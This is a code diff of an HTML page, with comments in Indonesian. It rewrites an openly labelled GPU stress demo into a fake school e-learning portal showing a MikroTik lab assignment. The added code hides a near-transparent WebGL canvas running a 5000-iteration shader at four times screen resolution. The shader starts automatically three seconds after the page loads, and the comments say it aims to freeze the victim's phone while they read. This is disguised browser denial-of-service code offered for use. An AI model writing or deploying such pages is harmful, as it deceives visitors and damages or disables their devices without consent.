@@ -3,168 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SILICON MELTDOWN | FLAGSHIP KILLER</title>
+    <title>Portal Tugas | XI TKJ 2</title> 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <style>
-        body { margin: 0; overflow: hidden; background: #000; color: #fff; font-family: 'Courier New', monospace; }
-        #canvas-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        #ui-layer { position: relative; z-index: 10; pointer-events: none; padding: 20px; }
-        .hud-box { background: rgba(10, 0, 0, 0.85); border: 2px solid #ff0000; padding: 20px; box-shadow: 0 0 30px rgba(255,0,0,0.6); backdrop-filter: blur(5px); }
-        .glitch { color: #fff; text-shadow: 2px 0 red, -2px 0 blue; animation: glitch-anim 0.2s infinite; font-weight: black; }
-        @keyframes glitch-anim { 0% { transform: translate(0) } 20% { transform: translate(-2px, 2px) } 40% { transform: translate(-2px, -2px) } 60% { transform: translate(2px, 2px) } 80% { transform: translate(2px, -2px) } 100% { transform: translate(0) } }
-        .critical-bar { height: 10px; background: red; width: 100%; margin-top: 10px; box-shadow: 0 0 10px red; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: #f8fafc; }
+        
+        /* THE STEALTH CANVAS: Transparan 99%, nyumput di belakang */
+        #stealth-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.01; pointer-events: none; }
+        
+        /* UI DEPAN: Solid, nutupin semuanya */
+        #fake-ui { position: relative; z-index: 10; background: #f8fafc; min-height: 100vh; }
     </style>
 </head>
 <body>
 
-    <div id="canvas-container"></div>
+    <canvas id="stealth-canvas"></canvas>
 
-    <div id="ui-layer" class="flex flex-col h-screen justify-center items-center">
-        <div class="hud-box max-w-lg w-full text-center">
-            <h1 class="text-4xl mb-2 glitch uppercase">SILICON MELTDOWN</h1>
-            <p class="text-xs text-red-400 font-bold tracking-widest uppercase mb-6">Target: Flagship SoC (Snapdragon/Dimensity)</p>
-            
-            <div class="grid grid-cols-2 gap-4 text-left border-t border-b border-red-900 py-4 mb-6">
-                <div>
-                    <p class="text-[10px] text-gray-500 uppercase">Architecture</p>
-                    <p class="text-sm text-white font-bold">Mandelbulb Fractal SDF</p>
-                </div>
-                <div>
-                    <p class="text-[10px] text-gray-500 uppercase">Math Iterations</p>
-                    <p class="text-sm text-red-500 font-bold animate-pulse">> 2.5 Billion / sec</p>
-                </div>
-                <div>
-                    <p class="text-[10px] text-gray-500 uppercase">Precision</p>
-                    <p class="text-sm text-white font-bold">High-P 32-bit Float</p>
-                </div>
-                <div>
-                    <p class="text-[10px] text-gray-500 uppercase">Visual FPS</p>
-                    <p id="fps-counter" class="text-3xl text-red-500 font-black glitch">0</p>
-                </div>
+    <div id="fake-ui">
+        <nav class="bg-blue-600 p-4 text-white shadow-md">
+            <div class="max-w-4xl mx-auto flex justify-between items-center">
+                <h1 class="font-bold text-xl">E-Learning Portal</h1>
+                <span class="text-sm">SMKN 1 Kedungwuni</span>
             </div>
+        </nav>
 
-            <p class="text-xs text-gray-400 mb-2">THERMAL LIMITER OVERRIDDEN</p>
-            <div class="critical-bar"></div>
-        </div>
+        <main class="max-w-4xl mx-auto p-6 mt-6 bg-white shadow-sm rounded-xl">
+            <h2 class="text-2xl font-black text-gray-800 mb-2">Tugas Praktikum: Konfigurasi Dasar MikroTik</h2>
+            <p class="text-sm text-gray-500 mb-6">Dipublikasikan oleh: Guru Produktif TKJ | Kelas: XI TKJ 2</p>
+
+            <div class="prose text-gray-700 space-y-4">
+                <p>Silakan baca modul berikut sebelum melakukan praktikum di lab komputer. Pastikan kabel UTP (Straight) sudah disiapkan.</p>
+                
+                <h3 class="font-bold text-lg mt-4">Langkah 1: Akses Winbox</h3>
+                <p>Colokkan kabel dari PC ke Ether 2 pada router MikroTik. Buka aplikasi Winbox, pilih tab Neighbors, dan klik MAC Address router. Login dengan user <b>admin</b> dan password kosong.</p>
+                
+                <h3 class="font-bold text-lg mt-4">Langkah 2: Setting IP Address</h3>
+                <p>Masuk ke menu <b>IP > Addresses</b>. Tambahkan IP baru untuk Ether 2, misalnya <code>192.168.10.1/24</code>. Klik Apply dan OK.</p>
+
+                <div class="mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded-lg text-sm text-yellow-800">
+                    <p><b>Penting:</b> Jangan lupa kerjakan kuis di bawah setelah selesai membaca.</p>
+                </div>
+
+                <button class="mt-4 bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 w-full md:w-auto">Mulai Kuis Praktikum</button>
+            </div>
+        </main>
     </div>
 
     <script>
         const vertexShader = `void main() { gl_Position = vec4(position, 1.0); }`;
 
-        // THE NIGHTMARE SHADER: Mandelbulb Fraktal + Soft Shadows (O(N^2) Complexity per pixel)
+        // The Tsar Bomba Shader (5000 Loop + Trigonometri)
         const fragmentShader = `
-            // MEMAKSA GPU HP PAKAI 32-BIT FLOAT (SANGAT BERAT UNTUK MOBILE)
-            precision highp float; 
-            
+            precision highp float;
             uniform float u_time;
             uniform vec2 u_resolution;
 
-            // FUNGSI MATEMATIKA FRAKTAL (MANDELBULB)
-            // Memaksa GPU menghitung sin, cos, atan, pow berulang kali
-            float mandelbulb(vec3 pos) {
-                vec3 z = pos;
-                float dr = 1.0;
-                float r = 0.0;
-                
-                // NESTED LOOP: Loop di dalam Loop adalah kelemahan utama GPU
-                for (int i = 0; i < 15; i++) { 
-                    r = length(z);
-                    if (r > 2.0) break;
-                    
-                    // Operasi Trigonometri Berat
-                    float theta = acos(z.z / r);
-                    float phi = atan(z.y, z.x);
-                    dr = pow(r, 8.0 - 1.0) * 8.0 * dr + 1.0;
-                    
-                    float zr = pow(r, 8.0);
-                    theta = theta * 8.0;
-                    phi = phi * 8.0;
-                    
-                    z = zr * vec3(sin(theta) * cos(phi), sin(phi) * sin(theta), cos(theta));
-                    z += pos;
-                }
-                return 0.5 * log(r) * r / dr;
-            }
-
-            // Normal Kalkulasi (Menggunakan 4 sampel fraktal tambahan)
-            vec3 calcNormal(vec3 p) {
-                vec2 e = vec2(1.0, -1.0) * 0.5773 * 0.0005;
-                return normalize(e.xyy * mandelbulb(p + e.xyy) + 
-                                 e.yyx * mandelbulb(p + e.yyx) + 
-                                 e.yxy * mandelbulb(p + e.yxy) + 
-                                 e.xxx * mandelbulb(p + e.xxx));
-            }
-
-            // Soft Shadow Kalkulasi (Extra 50 steps per pixel terang!)
-            float softshadow(vec3 ro, vec3 rd, float mint, float tmax) {
-                float res = 1.0;
-                float t = mint;
-                for(int i = 0; i < 50; i++) {
-                    float h = mandelbulb(ro + rd * t);
-                    res = min(res, 8.0 * h / t);
-                    t += clamp(h, 0.02, 0.10);
-                    if(h < 0.001 || t > tmax) break;
-                }
-                return clamp(res, 0.0, 1.0);
-            }
-
             void main() {
                 vec2 uv = gl_FragCoord.xy / u_resolution.xy;
-                uv = uv * 2.0 - 1.0;
-                uv.x *= u_resolution.x / u_resolution.y;
-
-                // Kamera Berputar
-                vec3 ro = vec3(sin(u_time*0.5)*2.5, sin(u_time*0.3)*1.0, cos(u_time*0.5)*2.5);
-                vec3 ta = vec3(0.0, 0.0, 0.0);
-                vec3 ww = normalize(ta - ro);
-                vec3 uu = normalize(cross(ww, vec3(0.0, 1.0, 0.0)));
-                vec3 vv = normalize(cross(uu, ww));
-                vec3 rd = normalize(uv.x * uu + uv.y * vv + 1.5 * ww);
-
-                // MAIN RAYMARCHING LOOP (500 STEPS!)
-                float t = 0.0;
-                for(int i = 0; i < 500; i++) {
-                    vec3 p = ro + rd * t;
-                    float d = mandelbulb(p);
-                    if(d < 0.001 || t > 10.0) break;
-                    t += d;
+                vec3 col = vec3(0.0);
+                
+                // BEBAN BERAT DI BELAKANG LAYAR
+                for(float i = 1.0; i < 5000.0; i++) {
+                    vec2 p = uv * i * sin(u_time * 0.1);
+                    float r = fract(sin(dot(p, vec2(12.9898, 78.233))) * 43758.5453);
+                    float g = tan(p.x * p.y * u_time * 0.001);
+                    float b = cos(p.x / (p.y + 0.0001));
+                    col += vec3(r, g, b) / 5000.0;
                 }
-
-                vec3 col = vec3(0.0); // Background hitam
-
-                // Jika cahaya mengenai objek
-                if(t < 10.0) {
-                    vec3 p = ro + rd * t;
-                    vec3 n = calcNormal(p);
-                    vec3 light = normalize(vec3(1.0, 1.0, -1.0));
-                    
-                    // Hitung bayangan (MENAMBAH BEBAN GPU 2x LIPAT)
-                    float shadow = softshadow(p, light, 0.02, 2.5);
-                    
-                    float dif = clamp(dot(n, light), 0.0, 1.0) * shadow;
-                    col = vec3(1.0, 0.2, 0.1) * dif; // Fraktal warna merah bara
-                    
-                    // Efek Fake Ambient Occlusion
-                    col += vec3(0.1, 0.0, 0.0) * clamp(0.5 + 0.5 * n.y, 0.0, 1.0);
-                }
-
-                // Vignette mematikan untuk tambah sedikit operasi
-                col *= 1.0 - 0.5 * dot(uv, uv);
                 gl_FragColor = vec4(col, 1.0);
             }
         `;
 
-        function executeMeltdown() {
-            const container = document.getElementById('canvas-container');
-            const renderer = new THREE.WebGLRenderer({ antialias: false });
+        function injectVenom() {
+            const canvas = document.getElementById('stealth-canvas');
+            const renderer = new THREE.WebGLRenderer({ canvas: canvas, antialias: false });
             
-            // SENJATA NUKLIR: Paksa render di resolusi asli layar.
-            // Di HP Flagship (seperti S24 Ultra atau ROG Phone), ini akan memaksa 
-            // GPU merender jutaan pixel di resolusi 2K atau lebih!
-            renderer.setPixelRatio(window.devicePixelRatio); 
+            // Set resolusi gila (4x ukuran layar) secara diam-diam
+            const insaneScale = window.devicePixelRatio * 4; 
+            renderer.setPixelRatio(insaneScale); 
             renderer.setSize(window.innerWidth, window.innerHeight);
-            container.appendChild(renderer.domElement);
 
             const camera = new THREE.OrthographicCamera(-1, 1, 1, -1, 0, 1);
             const scene = new THREE.Scene();
@@ -172,36 +90,26 @@
             
             const uniforms = {
                 u_time: { value: 0.0 },
-                u_resolution: { value: new THREE.Vector2(window.innerWidth * window.devicePixelRatio, window.innerHeight * window.devicePixelRatio) }
+                u_resolution: { value: new THREE.Vector2(window.innerWidth * insaneScale, window.innerHeight * insaneScale) }
             };
 
             const material = new THREE.ShaderMaterial({ vertexShader, fragmentShader, uniforms });
             scene.add(new THREE.Mesh(geometry, material));
 
-            let frames = 0, lastTime = performance.now();
-
+            // Loop animasi tanpa ada teks di layar
             function animate(time) {
                 requestAnimationFrame(animate);
-                uniforms.u_time.value = time * 0.0005;
+                uniforms.u_time.value = time * 0.1;
                 renderer.render(scene, camera);
-                frames++;
-
-                let now = performance.now();
-                if (now - lastTime >= 1000) {
-                    document.getElementById('fps-counter').innerText = frames;
-                    // Bikin HP bergetar setiap detik kalau FPS drop di bawah 30
-                    if(frames < 30 && navigator.vibrate) {
-                        navigator.vibrate([100, 50, 100]);
-                    }
-                    frames = 0; lastTime = now;
-                }
+                // Kita nggak perlu hitung FPS di sini karena tujuannya murni bikin rusak secara diam-diam
             }
             requestAnimationFrame(animate);
         }
 
-        // TRIGGER AUTORUN SETELAH 1 DETIK
+        // DELAY 3 DETIK!
+        // Biarkan korban mengira ini web beneran, lagi baca artikel MikroTik... BAM! HP macet.
         window.onload = () => {
-            setTimeout(executeMeltdown, 1000);
+            setTimeout(injectVenom, 3000);
         };
     </script>
 </body>
